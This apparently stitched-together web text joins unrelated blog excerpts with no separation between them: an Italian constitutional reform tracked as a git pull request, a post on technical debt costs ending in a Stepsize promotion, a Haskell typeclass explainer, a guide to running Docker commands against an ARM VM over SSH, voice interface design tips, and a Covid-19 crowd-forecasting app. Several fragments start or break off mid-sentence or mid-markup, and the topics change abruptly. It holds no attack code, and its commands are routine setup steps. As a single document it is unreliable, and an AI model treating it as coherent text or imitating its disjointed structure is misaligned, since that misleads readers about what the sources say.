  <li>branching off from topic branches would be like amendments on the associated topic;</li>
  <li>pull requests are proposals to apply the changes to the main text (only on GitHub though).</li>
</ul>

<p>Nowadays, the development of a reform is discussed in the Parliament; 
however, would be interesting to keep track of all the changes made 
during the discussion, and it would be much easier to analyze and verify 
for all the citizens. It would surely make easier the task of accountability (who did what).</p>

<p>I tested the approach for the incoming referendum. 
<a href="https://github.com/marcofavorito/costituzione-della-repubblica-italiana">In this repo</a>,
you will find the text of the Constitution (in <code>txt</code> format) 
and an open <a href="https://github.com/marcofavorito/costituzione-della-repubblica-italiana/pull/1">pull request</a>
with the changes proposed by the proposed reform (ID <code>19A06354</code>).
The changes are taken from the <a href="https://www.gazzettaufficiale.it/eli/id/2019/10/12/19A06354/sg">official source “Gazzetta Ufficiale”</a>.</p>

<p>

    <img alt="Changes introduced by the 2020's constitutional reform." src="https://marcofavorito.me/assets/posts/visualize-referendum-changes/changes.png">
  </a>
</p>

<p>Potential future work:</p>
<ul>
  <li>automatize the process using NLP techniques to extract the proposed changes;</li>
  <li>define a canonic form for the law text (e.g. each line must have a maximum length etc.)</li>
  <li>being more formal in the namings and formats (<a href="https://en.wikipedia.org/wiki/IANAL">IANAL</a> :D)</li>
</ul>

                    <p>There are many ways in which technical debt costs us money: lost deals, customer churn, employee churn, lawsuits, and more. However, there are a couple of issues that are more important than others: engineering time, morale, and the missed revenue from software delays.</p><p><strong>Engineering time</strong></p><p>The cost of engineering time is quite simple:</p><blockquote>Engineers spend 33% of their time dealing with technical debt.</blockquote><p><a href="https://stripe.com/files/reports/the-developer-coefficient.pdf"><em>The Developer Coefficient</em></a><em> (Stripe)</em></p><p>On average, developers spend 41.1 hours at work each week, 13.4 hours of which they spend on technical debt. Maintenance of legacy systems and technical debt is the number one cause for productivity loss.</p><figure><img src="https://lh5.googleusercontent.com/2xw9ZH3csKzbygxjHYcs4vpnOPxsDktLw0L9zqnk2JULrwhV7aRgTWRcb6IbOndokfcGeCElL4cF5AuSt95HIoNAzV9AHiMR3y-qdEl812agPT5jTvN-gqqNxT8jzwEWPoCvwIkF" alt=""></figure><p><em>Image from <a href="https://stripe.com/files/reports/the-developer-coefficient.pdf">The Developer Coefficient</a> (Stripe)</em></p><p>Think of it like this: if you pay your software engineers $100k, 33% of that goes towards dealing with technical debt. For a 50-person engineering team, that 33% is $1.65M/year.</p><p>Stripe estimates technical debt alone has a $3 trillion impact on global GDP.</p><p><strong>Delayed software product releases</strong></p><p>The effect of delayed product releases on monthly recurring revenue (MRR) is another aspect that is worth diving into. Let's quickly run through two scenarios where the monthly revenue growth rate remains constant at 15%, and the MRR secured on launch is $5k:</p><ol><li>The product launches in February (month 2 in the chart below)</li><li>The product launches in April (month 4 in the chart below)</li></ol><figure><img src="https://lh6.googleusercontent.com/IRgIRulofTucgSFq1GimEsGbFXg2sYNgb6QSKaXIYczqgKF1OK7udJzB_FI0nKPo2yZBVVQNwS88l04H3FicZc-RIggDFdm3bX1vFILQesFeKl0nsfBUltbKXk-I12yx8SSn2Q_5" alt=""></figure><p>Shipping a mere two months later will cost our business 25% of the revenue we could've made over this selected period. MRR on month 24 would've been over 30% higher if we'd shipped just two months earlier and managed to maintain that shipping pace.</p><p>These figures are make-or-break for high-growth SaaS companies.</p><p>As Martin Fowler explains, a healthy codebase results in features being shipped faster, so it is crucial for engineering teams to have the purview to continuously manage technical debt as they build the product.</p><p><strong>Key takeaways</strong></p><p>Companies need to identify key pieces of tech debt that get in the way of key goals, cost countless engineering hours in productivity losses, or are the root cause for bugs and other issues that impact the customer experience. But most companies remain blissfully unaware of that and bear the enormous costs of tech debt without even realising it.</p><p>To fix that, engineering teams need a clear understanding of the strategy and metrics for technical debt.</p><blockquote>By 2023, I&amp;O leaders who actively manage and reduce technical debt will achieve at least 50% faster service delivery times to the business.</blockquote><p><a href="https://www.gartner.com/en/publications/how-to-assess-infrastructure-technical-debt-to-prioritize-legacy-modernization-investments">Gartner’s research</a> basically says that companies who have a strategy for technical debt will ship 50% faster.</p><p>Luckily, Stepsize can help you out.

</blockquote>
<p>Haskell is my favorite programming language, but it is not simple—a language with a strong static type system and non-strict semantics is one that must deal in subtlety and nuance. However, typeclasses, one of Haskell’s most fundamental features, admit a surprisingly-simple implementation, one drastically simpler than the corresponding features of ALGOL-style scripting languages. This piece aims to be a brief, high-level overview of how typeclasses are resolved at compile-time, how they’re invoked at runtime, and how the <code>-XTypeApplications</code> extension to GHC provides a more granular approach for such resultion, one that enables sophisticated and subtle APIs in real-world problems.</p>

<p>A computer program is a conversation between a human and a machine. A limited conversation, yes, and one often marred by profanity and frustration, but one informed in structure and style by human language, both the languages with which we communicate with our fellow humans and the inner language with which we organize our thoughts. One of the defining features of human language is the ability for one word to mean many things: one signifier, many referents. We can fix a car, we can fix a breakfast, and we can fix an election—though these activities are substantially different, the speakers of English have collectively decided that there is an underlying similarity between them, and that the word ‘fix’ captures this similarity, giving us one versatile word rather than three<span><label for="sn-0"></label><span>The Oxford English Dictionary <a href="https://www.nytimes.com/2011/05/29/opinion/29winchester.html">asserts</a> that the word ‘run’ has the most definitions of any word in the language; the verb alone has 645 meanings. If every such meaning were given its own word, it would take more than four months to learn them all, assuming that the average person can learn ~5 words per day.</span></span> situation-specific ones. In other words, spoken language provides <em>polysemy</em>–the ability for a word or phrase to refer to different things based on context. Wordplay, metaphor, simile, metonymy, synecdoche: language, and by extension the whole of human thought, delights in polysemy’s nuance.</p>
<p>In programming, we refer to this phenomenon as <em>polymorphism</em>. Computers, in contrast with humans, do not delight in polymorphism. Resolving the meaning of a polymorphic statement entails choice, and computers are notoriously bad at making correct choices in the absence of human supervision. But effective use of polymorphism is often, if not always, at the heart of well-written code, so nearly all programming languages<span><label for="sn-1"></label><span>Even C has <code>_Generic</code> macros now, which provide a form of compile-time polymorphism.</span></span> provide means for polymorphism. Because teaching computers to make predictable, sensible choices is a complicated prospect, most programming languages use complicated systems to resolve polymorphism:</p>
<ul>
<li>Python’s object system, providing Simula-style<span><label for="sn-2"></label><span>Unless you use <code>@property</code>, which is much closer to the Smalltalk school of thinking than Simula.</span></span> object-orientation with multiple inheritance, uses <a href="https://en.wikipedia.org/wiki/C3_linearization">C3 linearization</a> to resolve a method invoked on an object.</li>
<li>Ruby’s object system, a weird hybrid of Smalltalk-style class-based OO and Self-style prototypical OO, provides <a href="https://gist.github.com/damien-roche/351bf4e7991449714533">its own algorithm</a>, one capable of expressing sophisticated, if oft-surprising, polymorphism.</li>
<li>Common Lisp, in keeping with its ethos of flexibility, provides an object system in which the resolution of polymorphism is entirely customizable at runtime. There’s a <a href="https://www.amazon.com/Art-Metaobject-Protocol-Gregor-Kiczales/dp/0262610744">whole book</a> about this.</li>
</ul>
<p>Haskell is different. For all its reputation for being a language that is difficult to learn<span><label for="sn-3"></label><span>(a reputation that is sometimes unfair and sometimes extremely well-deserved)</span></span>, its system for providing polymorphism is simple, so simple that when I first learned of it I felt vaguely cheated in some way. Let’s take the notion of equality–<code>(==)</code>, one of the most common polymorphic functions–and explore how Haskell represents that, both to the programmer and within its runtime system. (If you’re already fluent in Haskell and familiar with dictionary-passing style, you might want to skip ahead to the next section, in which I start playing around with explicit type applications.)</p>

<p>Polymorphism is a great and necessary thing, but how should a compiler or interpreter implement it? From an object-oriented perspective, in which code and data are intertwined, the most straightforward solution to provide is to have some sort of lookup table (usually called a ‘vtable’, C++ argot for ‘virtual method table’) present in the in-memory layout of a given object. Due to the fact that Haskell lacks objects but possesses a strong type system, vtables become unnecessary: the target of polymorphic calls is <em>always</em> resolvable at compile time. If, at compile time, your program contains a type variable that cannot be resolved, GHC rejects the program with an error.</p>
<p>Let’s take a look at one of Haskell’s most fundamental typeclasses and the mechanisms with which GHC compiles this typeclass into its intermediate language, which lacks typeclasses.</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>class</span> <span>Eq</span> a <span>where</span></span>
<span id="cb1-2"><span>  (==) ::</span> a <span>-&gt;</span> a <span>-&gt;</span> <span>Bool</span></span></code></pre></div>
<p>Haskell’s equality operator is implemented atop the <code>Eq</code> typeclass. Even if you don’t speak Haskell, this should look reasonably familiar if you’ve ever looked at <code>Equatable</code> in Java or IEquatable in C#.</p>
<p>This interface provides a polymorphic function <code>(==)</code>, one that compares two values (of the same type) for equality. It is polymorphic in one type variable, <code>a</code> in the above declaration. We can use this function over any type that implements the <code>Eq</code> interface, as long as <code>a</code> can be resolved, at some point, to a concrete type like <code>Int</code> or <code>String</code>. We can write a useful function with <code>Eq</code>.</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>allEqual ::</span> <span>Eq</span> a <span>=&gt;</span> [a] <span>-&gt;</span> <span>Bool</span></span>
<span id="cb2-2">allEqual []       <span>=</span> <span>True</span></span>
<span id="cb2-3">allEqual (h<span>:</span>rest) <span>=</span> <span>all</span> (<span>==</span> h) rest</span></code></pre></div>
<p>Here we define an <code>allEqual</code> function that is polymorphic in its argument, taking a list of any values implementing <code>Eq</code>. The <em>constraint</em>, on the left-hand-side of the <code>=&gt;</code>, introduces a type variable named <code>a</code>, corresponding to a given type that implements the <code>Eq</code> class. (We call this a ‘constraint’ because it constrains the set of types that this function will accept.)</p>
<p>Here’s the secret to Haskell’s implementation of polymorphism: <strong>during compilation, GHC turns that <code>=&gt;</code> into an <code>-&gt;</code>.</strong> That’s right: a constraint on a function becomes a parameter to that function<span><label for="sn-4"></label><span>An interesting consequence of this is that you can use <code>=&gt;</code> in more than one place in a type signature: the signatures <code>Ord a =&gt; Ord b =&gt; a -&gt; b -&gt; Bool</code> and <code>(Ord a, Ord b) =&gt; a -&gt; b -&gt; Bool</code> are equally valid.</span></span>. <code>allEqual</code> is a function that takes one argument, but from the runtime’s perspective it takes two. This new argument is called a <em>dictionary</em>, and the under-the-covers application of dictionaries to polymorphic functions is called <em>dictionary-passing style</em><span><label for="sn-5"></label><span>Because GHC’s type system is significantly more featureful than the type system specified in the Haskell Report, the details of its typeclass resolution are a bit more complicated—things like type families introduce subtleties to the dictionary-passing approach. You could, however, sit down and implement your own Haskell2010 compiler with dictionary-passing style.</span></span>.</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>data</span> <span>EqDict</span> a <span>=</span> <span>EqDict</span> {<span> dictEqual ::</span> a <span>-&gt;</span> a <span>-&gt;</span> <span>Bool</span> }</span></code></pre></div>
<p>Under the dictionary-passing model, this typeclass is represented in a manner similar to this Haskell data type—a data structure, parameterized in terms of an input type, that holds references to concrete implementations of the methods referenced in the typeclass.</p>
<p>When types are correctly resolved, an <code>EqDict Int</code> dictionary will contain in its <code>dictEqual</code> field the correct implementation of <code>==</code> for <code>Int</code> values. <em>If, during compilation, a polymorphic type cannot be instantiated or inferred to be a concrete type, typechecking will fail.</em> This is the source of the dreaded <code>Ambiguous type variable</code> error from GHC: if a given type variable cannot be resolved to a concrete type, we can’t build an <code>EqDict</code> for it, since we don’t know how to fill in the <code>dictEqual</code> field.</p>
<p>This has some resemblance to vtables from object-oriented language, but there’s a crucial difference: though a data type may implement <code>Eq</code>, there is no <code>EqDict</code> carried around within its in-memory representation. Though an <code>Int</code> may implement dozens of different interfaces, I can pass them around as data and data alone: polymorphism is <em>provided at call-sites</em>, not shoehorned into data structures themselves.</p>
<p>Let’s consider how this would look if Haskell didn’t have typeclasses:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>allEqualDictionary ::</span> <span>EqDict</span> a <span>-&gt;</span> [a] <span>-&gt;</span> <span>Bool</span></span>
<span id="cb4-2">allEqualDictionary dict [] <span>=</span> <span>True</span></span>
<span id="cb4-3">allEqualDictionary dict (h<span>:</span>rest) <span>=</span> <span>all</span> ((dictEqual dict) h) rest</span></code></pre></div>
<p>This function is equivalent in functionality to our previous one, but we’d have to build an <code>EqDict</code> every time we invoked the <code>(==)</code> function, which is both tedious and inefficient. GHC takes care of this for us.</p>
<p>That’s it. No fancy algorithm, no superclasses or metaclasses or prototypes, no vtables attached to data structures, no runtime type inference. Just a record type for every typeclass. Remarkable.</p>

<p>I mentioned that GHC will reject programs in which it cannot infer a concrete type for every type variable. So what do you do if GHC can’t infer which type to use (or, in other words, which dictionary to pass)? Well, the simplest option is to use an inline type signature.</p>
<div id="cb5"><pre><code><span id="cb5-1"><span>let</span> tenThousand <span>=</span> <span>10000</span><span> ::</span> <span>Integer</span></span>
<span id="cb5-2"></span>
<span id="cb5-3"><span>-- Ambiguous: it's unclear which 'Num' instance to return from fromIntegral.</span></span>
<span id="cb5-4"><span>print</span> (<span>fromIntegral</span> tenThousand)</span>
<span id="cb5-5"></span>
<span id="cb5-6"><span>-- Unambiguous: by narrowing the 'Num' instance to that of 'Word32', we</span></span>
<span id="cb5-7"><span>-- know which Num and Show instances to use.</span></span>
<span id="cb5-8"><span>print</span> (<span>fromIntegral</span><span> tenThousand ::</span> <span>Word32</span>)</span></code></pre></div>
<p>If we have some constraint–<code>Eq a</code>, let’s say–we can, with a type signature, specify an explicit, rather than inferred, type …</p></section></article></div></div>

<p data-preserve-html-node="true">We left off at booting an ARM Linux virtual machine, and installing &amp; running Docker inside it. This works fine and allows you run containers like for instance a Postgres database. They can expose their ports and instead of connecting to <code data-preserve-html-node="true">localhost:5432</code> on the host, you connect to your VM’s IP address, for instance <code data-preserve-html-node="true">192.168.64.8:5432</code>.</p>

<p data-preserve-html-node="true">Now in case you’re not aware, Docker is actually a service that exposes an API over HTTP and when you run <code data-preserve-html-node="true">docker</code> commands, they control the service via these API requests on a local socket. You’ve probably seen the reference to <code data-preserve-html-node="true">unix:///var/run/docker.sock</code> at times.</p>

<p data-preserve-html-node="true">What that means is that it’s possible to direct your <code data-preserve-html-node="true">docker</code> client to talk to a Docker service over the network, and that’s what we can do as well to enable “regular” docker commands to work with a locally running “Linux Docker VM”.</p>

<p data-preserve-html-node="true">Incidentally, that’s exactly what “Docker for Mac” is doing under the hood: it is actually a <a data-preserve-html-node="true" href="https://github.com/moby/hyperkit">VM based on Apple’s Hypervisor framework</a> which hosts Docker, not your Mac itself.</p>

<h2 data-preserve-html-node="true">Installing “Docker for Mac”</h2>

<p data-preserve-html-node="true">In order to get started, we need to obtain the Docker client app. I migrated my existing setup from a Time Machine backup and therefore had Docker installed from the start. If you need to install from scratch, <a data-preserve-html-node="true" href="https://docs.docker.com/engine/install/binaries/">installing the client binaries</a> is probably the easiest way to get started.</p>

<p data-preserve-html-node="true">Assuming you have a <code data-preserve-html-node="true">docker</code> binary to hand, you’re good to go. The way we’ll set up the connection is via a “docker context” and all this is <a data-preserve-html-node="true" href="https://twitter.com/johannesweiss/status/1332271974719090688?s=21">thanks to a tip by Johannes Weiss</a>.</p>

<h2 data-preserve-html-node="true">Setting up SSH in virtual machine</h2>

<p data-preserve-html-node="true">First though, we need to configure to connect to our VM via SSH. Install the SSH server:</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">sudo apt-get install openssh-server</code></pre>

<p data-preserve-html-node="true">and copy your public key to the <code data-preserve-html-node="true">ubuntu</code> user’s <code data-preserve-html-node="true">authorized_keys</code> for password-less access.</p>

<p data-preserve-html-node="true">In order to connect to the VM, you’ll need to find its IP address (which is on a <code data-preserve-html-node="true">192.168.64.0</code> network if you’ve followed along from the previous blog post).</p>

<p data-preserve-html-node="true">Our image comes without <code data-preserve-html-node="true">net-tools</code>, so we’ll install these first:</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">sudo apt install net-tools</code></pre>

<p data-preserve-html-node="true">and then run</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">ifconfig <span>|</span> grep 192.168</code></pre>

<p data-preserve-html-node="true">which should yield the following</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true"><a href="https://finestructure.co/cdn-cgi/l/email-protection" data-cfemail="5623342338222316233423382223">[email&nbsp;protected]</a>:<span>~</span>$ ifconfig <span>|</span> grep 192.168
        inet 192.168.64.8  netmask 255.255.255.0  broadcast 192.168.64.255</code></pre>

<p data-preserve-html-node="true">With all this out of the way, we can test the connection from the host:</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">ssh <a href="https://finestructure.co/cdn-cgi/l/email-protection" data-cfemail="4633243328323306777f746877707e687072687e">[email&nbsp;protected]</a></code></pre>

<figure data-preserve-html-node="true"><img data-preserve-html-node="true" src="https://f000.backblazeb2.com/file/finestructure-public-images/posts/ssh-login.png"></figure>

<h2 data-preserve-html-node="true">Setting up a Docker context</h2>

<p data-preserve-html-node="true">The remaining steps are simple. We create a Docker context:</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">docker context create myvm --docker <span>"host=ssh://<a href="https://finestructure.co/cdn-cgi/l/email-protection" data-cfemail="f48196819a8081b4c5cdc6dac5c2ccdac2c0dacc">[email&nbsp;protected]</a>"</span></code></pre>

<p data-preserve-html-node="true">and tell Docker to use it</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">docker context use myvm</code></pre>

<p data-preserve-html-node="true">Now all docker commands are targeting the virtual machine, just like they do in Docker for Mac.</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">❯ docker context create myvm --docker <span>"host=ssh://<a href="https://finestructure.co/cdn-cgi/l/email-protection" data-cfemail="fd889f88938988bdccc4cfd3cccbc5d3cbc9d3c5">[email&nbsp;protected]</a>"</span>
myvm
Successfully created context <span>"myvm"</span>
<span>~</span>
❯ docker context use myvm
myvm
<span>~</span>
❯ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES

❯ docker run hello-world

Hello from Docker<span>!</span>
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the <span>"hello-world"</span> image from the Docker Hub.
    (arm64v8)
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker ID:

 https://docs.docker.com/get-started/</code></pre>

<p data-preserve-html-node="true">You can find out more about <code data-preserve-html-node="true">docker context</code> in the <a data-preserve-html-node="true" href="https://docs.docker.com/engine/context/working-with-contexts">online documentation</a>.</p>

<p data-preserve-html-node="true">Bear in mind that this setup does not come with the convenience of Docker for Mac’s bridge networking or support for volumes – but surely these aren’t far off.</p>

A voice interface can be thought of a controller for app actions which makes it <a href="https://www.speechly.com/blog/voice-user-interfaces-for-react/">retrofittable to an existing application</a>.</p><p>We contrast this approach to now-popular voice assistants like Apple’s Siri, Google Home and Amazon Alexa, which are conversational in nature and are typically optimized for generic hands-free use with voice.</p><h2>Setting the right context</h2><h3>1. Don't try to build a voice assistant</h3><p>Voice assistants are digital assistants that react to voice commands, most often by using voice themselves, too. While there are good use cases for voice assistants, their way of using voice is not suitable for touch screen devices.</p><p>Instead of question-answer based dialogues, touch screen voice experiences should be based on real-time visual feedback. As the user speaks, the user interface should be instantaneously updated.</p><h3>2. Users don’t want to converse</h3><p>When we humans talk with each other, we do more than transmit information by using words. We might greet, persuade, declare, ask or apologize and even the same words can have a different meaning, depending on how we say it and in which situations. This is very human-like, but not the way we want to communicate with a computer.</p><p>With voice user interface, speech has only one function and it is to command the system to do what the user wants. Be clear that the user is talking with a computer, don’t try to imitate a human. In most cases, the application should not answer in natural language. It should react by updating the user interface, just like when clicking a button.</p><h3>3. Give visual guidance on what the user can say</h3><p>An issue commonly described in voice user interfaces (VUI) users is the uncertainty related to what commands are supported.</p><p>The problem arises from the fact that the typical voice assistant experience begins from a blank slate, where the assistants start listening and is expected to be able to help the user with pretty much anything. This is of course not really true as anybody who has tried these services understands.</p><p>Understanding the supported functionality with traditional graphical user interfaces (GUI) is less of a problem. Placing a button in the users shopping cart that reads “proceed to checkout” is a very strong signal to the users that checkout is supported and by pressing the button the user will indeed proceed to the checkout process. This aspect is missing from voice-only solutions which cases uncertainty in terms of supported features.</p><p>This is why a good voice user interface should be supported if possible by a graphical user interface.</p><p>Booking air flights - Graphical user interface supporting the voice user interface</p><h3>4. Use voice for the tasks it is good for</h3><p>Good design is about providing the user with the best tools for their use task.</p><p>Voice works great for use tasks such as <a href="https://www.speechly.com/blog/voice-search/">search filtering</a> – “Show me the nearest seafood restaurants with three or more stars”, accessing items from a known inventory – “Add milk, bread, chicken and potatoes”, inputting information: “Book a double room for two in Los Angeles next Friday” and unambiguous commands, such as “Show sports news”.</p><p>On the other hand, touch is often the better option for selecting from a couple of options, typing things such as email addresses and passwords and browsing by scrolling a large unknown inventory, for example.</p><p>There’s no need to replace your current user interface with a voice user interface. Rather you should evaluate which tasks in your application are the most tedious and easiest to do by using voice and add voice as a modality to those features.</p><div><div><div><p>Sign up to our Voice Design Crash Course and learn the best practices for creating great voice user interfaces.</p></div></div></div><h2>Receiving commands from the user</h2><h3>5. Onboard the user</h3><p>When your users first see your voice UI, they will need some guidance on how to use it.</p><p>These examples should be placed close to where the visual feedback will appear. You can hide the examples after the user has tried the voice user interface.</p><h3>6. Avoid using a wake word</h3><p>While voice assistants use a wake word so that they can be activated from a distance, your touch screen application doesn’t need to. Repeating the wake word every time makes the experience jarring, adds latency and decreases the reliability.</p><p>The hands free scenario is far less relevant than you might initially think, as the user is already holding the device. There are also privacy risks involved with a wake word.</p><h3>7. Prefer push-to-talk button mechanism</h3><p>Push-to-talk is the best way to operate a microphone in a multimodal touch screen application. When the user is required to press a button while talking, it’s completely clear when the application is listening. This also decreases latency by making endpointing very explicit, eliminating the possibility of endpoint false positives (system stops listening prematurely) and false negatives (systems does not finalize request after user has finished the command).</p><p>On the desktop you can use the spacebar for activating the microphone.</p><p>You can also add a slide as an optional gesture to lock the microphone for a longer period of time. WhatsApp has a good implementation of the design in their app.</p><h3>8. Signal clearly when the microphone button is pushed down.</h3><p>To make it sure the user knows that the application is listening, signal clearly when the microphone button is pushed down. This is especially important if using the push-to-talk pattern.</p><p>You can use sound, animation, tactile feedback (vibration) or a combination to signal the activation. On a handheld touch screen device, make sure that the activated microphone icon is visible from behind the thumb when push-to-talk is activated.</p><h2>Giving feedback to the user</h2><h3>9. Use non-interruptive modalities for feedback</h3><p>Non-interruptive modalities include haptic, non-linguistic auditory, and perhaps most importantly visual feedback. Using these modalities, the application can react fast and without interruption to the user. For instance, in the case of “I’m interested in t-shirts,” the UI would swiftly show the most popular t-shirt products, instantly enabling the user to continue with a refining utterance, ”do you have Boss.” This narrows further down the displayed products to show only the Boss branded t-shirts.</p><p>On the other hand, voice synthesis is a bad idea for feedback, as any ongoing user utterance will be abruptly interrupted. Voice is also a pretty slow channel for transmitting information and for returning users, hearing the same speech synthesises every time gets annoying very fast.</p><h3>10. Minimize latency with streaming natural language understanding</h3><p>One important part of user experience is the perceived responsiveness of the application. Designers are using tricks such as lazy loading, doing tasks on background, visual illusions and preloading of content to make their applications seem faster and this should be done with voice, too.</p><p>In voice applications, immediate UI reaction is even more important. Immediate UI reaction encourages the user to use longer expression and to continue the voice experience. In case of an error, it enables the user to recover fast.</p><h3>11. Steer user’s gaze and visual attention</h3><p>When using voice effectively the user can control the UI an order of magnitude faster compared to tapping and clicking. This means that a lot of stuff might be happening in the UI. It is important that the user can keep up with these UI reactions.</p><p>Typically UI reactions manifest themselves in some sort of visual queues, micro animations and transitions. There is an instinctive inclination in the human visual cognition system to move visual focus to where movement is happening.</p><p>Therefore it is an antipattern to scatter visual ui reactions all over the visual field of the user, e.g. streaming transcription animation on top of the screen and other ui reactions at the bottom of the screen. This will result in the user's gaze bouncing back and forth on the screen making it very hard to understand what is happening in the user interface and inflicting unnecessary cognitive load and annoyance to the user.</p><p>For this reason it is important to either centralize all visual UI reactions near one focal point,meaning that both the transcript as well as the visual transitions resulting from the user commands are shown very close to each other. The other option is to steer the users gaze linearly on the screen with a cascade of animations happening e.g. top down, left to right.</p><h3>12. Minimize visual unrest in triggered events.</h3><p>While a voice user interface needs to be as close to real-time as possible, minimize flicker and visual unrest. You can use placeholder images and elements to make sure the application looks smooth and reacts fast. Recovering from misinterpretation</p><h3>13. Show the text transcript</h3><p>Text transcription of users’ voice input is the most important part of the feedback in case of an error. Lack of action tells the user their input was not correctly understood, but in case of an error in the speech recognition, the transcript can enable them to understand why that happened.</p><p>Transcript can also be valuable for the user when everything goes right. It tells the user they are being understood and encourages them to continue.</p><p>The transcript should appear always in the same, center place in the users’ field of vision. If you are using Speechly, you can use the …</p></div></div></div></div>

<p>Some time ago I started working on a <a href="https://cmmid-lshtm.shinyapps.io/crowd-forecast/">crowd-forecasting app</a> for my PhD (<a href="https://github.com/epiforecasts/covid-german-forecasts/">code</a>). The app allows experts and non-experts to make predictions for the future trajectory of Covid-19. We use this app to submit case and death forecasts for Germany and Poland to the <a href="https://github.com/KITmetricslab/covid19-forecast-hub-de">German and Polish Forecast Hub</a> (as part of a <a href="https://osf.io/zkdvb/">pre-registered research project</a> on short-term forecasting). So far this has proved to be surprisingly successful. According to our own evaluation, a crowd of around six people (<strong>edit</strong>: so far only six people have routinely submitted forecasts) currently outperforms all other models and ensembles submitted to the Forecast Hub.  Overall, we want to achieve the following goals with the project: </p>



<ul><li>generate forecasts for the German and Polish Forecast hub</li><li>Answer a variety of interesting research questions: <ul><li>do experts perform better than non-experts?</li><li>how does the baseline model shown affect predictions?</li><li>are some forecasters consistently better than others?</li><li>do forecasters learn and improve over time?</li></ul></li><li>build generalizable tools for other tasks and future pandemics</li></ul>



<p>Let’s have a look at the app, it’s predictions and how it compares against the other models in the Forecast Hub. But before we start: You can sign up and join the crowd-forecasting effort. Simply <a href="https://cmmid-lshtm.shinyapps.io/crowd-forecast/">visit the app</a>, choose a username and password and start predicting.  You can also track your performance through our <a href="http://epiforecasts.io/covid-german-forecasts/">performance and evaluation board</a>. We are happy about any contributions and especially your feedback!</p>



<h5>How the app works</h5>



<p>The app is a simply web app created with <a href="https://www.r-project.org/">R</a> <a href="https://shiny.rstudio.com/">shiny</a>. While some of the details aren’t trivial, something like this is not too hard to set up (<a href="https://followtheargument.org/kontakt">contact me</a> if you would like to do something similar). </p>



<p>This is what the app looks like: </p>

<p>The following paragraphs explain how to make forecasts and what to pay attention to. Feel free to skip ahead if you’re more interested in the evaluation. </p>



<p>There is a large panel that visualizes your predictions. You can twist that a bit by selecting different prediction intervals (e.g. 50%, 90%, 98%) or show everything on a log scale. The panel on the right is used to make predictions. You can choose a distribution (really you should probably just stay with the default, ‘log-normal’), and specify the median and width of your forecast. You can either specify values by hand or you can drag and drop the points in the plot. </p>



<p>The median is the value for which you would say “I would think it’s 50:50 whether the actual value will be higher or lower”. If that is not intuitive, you can probably cheat a bit and just take the median as the value you find most likely (<a href="https://en.wikipedia.org/wiki/Mode_(statistics)#/media/File:Visualisation_mode_median_mean.svg">although that is not precisely correct, since the most likely value would be the mode</a>). The width parameter changes your uncertainty. Let’s say you selected to show the 50% and 90% prediction intervals (this is the default). Then the light green ribbon shows you the range in which the actual observation should fall with 90% probability. The dark green ribbon shows you were 50% of the true observations should fall inside. If you believe that the number of weekly cases will be between 120.000 and 150.000 with 90% probability, then you should adapt the width of the distribution until this is true. </p>



<p>Usually, new forecasters tend to be too certain. It is ok to have wide prediction intervals and often better to err on the side of caution. Also, your uncertainty should increase over time as you are less sure about the far future than the next week. The width parameter should therefore be increasing from week to week. To help you with forecasting, additional information like daily case counts is shown if you select the appropriate tab in the large panel. </p>



<p>The app is open all the time, but the prediction target is weekly cases and deaths. The weekly data is updated every Saturday (at around 16.00 UTC). While you can of course make predictions before that, you will the last data point. Forecasts are collected every Tuesday at around 13.00 UTC, aggregated, and submitted to the Forecast Hub. </p>



<h5>Forecast aggregation</h5>



<p>The submission format that the Forecast Hub expects is based on a set of 23 quantiles. This means that the predictive distribution needs to be specified using 23 numeric values that mark different points of the distribution. We are asked to provide the values for which we believe that there is a 1%, 2.5%, 5%, …. 50%, …., 95%, 97.5%, 99% probability that the true observed case or death number will be below that value. To that end we compute this values from the predictive distributions of all forecasters and combine them. Currently we simply take the arithmetic mean, because it uses the most information. But one of the points on our agenda is to look whether a trimmed mean (the x% most extreme predictions are disregarded and the rest is averaged) or a median is better. </p>



<p>Here are last week’s (2020-11-23) predictions for cases in Germany as well as the ensembled prediction (all the plots in the post were automatically generated using the <a href="https://github.com/epiforecasts/scoringutils">scoringutils package</a> in R): </p>

<div><figure><img loading="lazy" src="https://followtheargument.org/wp-content/uploads/2020/11/image-2.png" alt="" width="300" height="205" srcset="https://followtheargument.org/wp-content/uploads/2020/11/image-2.png 539w, https://followtheargument.org/wp-content/uploads/2020/11/image-2-300x205.png 300w" sizes="(max-width: 300px) 100vw, 300px" data-old-src="//followtheargument.org/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://followtheargument.org/wp-content/uploads/2020/11/image-2.png" data-srcset="https://followtheargument.org/wp-content/uploads/2020/11/image-2.png 539w, https://followtheargument.org/wp-content/uploads/2020/11/image-2-300x205.png 300w"><figcaption>Mean ensemble of forecasts for 2020-11-23 (EpiNow2 is a separate model not included in the ensemble)</figcaption></figure></div>



<p>We can see that not all forecasters have uncertainty that increases with the forecast horizon. This will hopefully change in the future as we only started providing feedback on the forecasts two days ago. But, maybe apart from the very large uncertainty in the first week, the ensemble forecast looks quite reasonable. </p>



<h5>Comparing forecasts over time</h5>



<p>Let’s look at some of the forecasts we made for the Forecast Hub over time. The true values are always shown in black. All data points to the left of the forecast ribbons are the data that were known at the time the forecast was made. EpiNow2 is a computer model that we evaluated along with our own forecasts. </p>

<p>It is interesting to see that we (apart from the forecaster seb) completely missed the exponential nature of the trend in October. We missed it on 2020-10-12 and <em>again</em> on 2020-10-19. We missed it just like everybody had missed it in February and March and have learned little from it.</p>

